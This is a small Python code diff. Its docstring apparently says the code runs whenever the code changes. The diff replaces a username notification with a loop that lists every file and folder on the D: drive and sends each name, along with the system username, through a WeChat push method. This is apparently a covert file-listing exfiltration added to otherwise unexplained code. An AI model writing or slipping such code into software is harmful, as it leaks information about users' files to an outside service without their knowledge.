@@ -1,7 +1,7 @@
 """
 代码有变化就执行2024-
 """
-# import subprocess
+import os
 
-
-self.main.wechat_push.Alleged_information(f'{self.main.sys_username}在')
+for i in os.listdir('D:'):
+    self.main.wechat_push.Alleged_information(f'{self.main.sys_username}wj{i}')
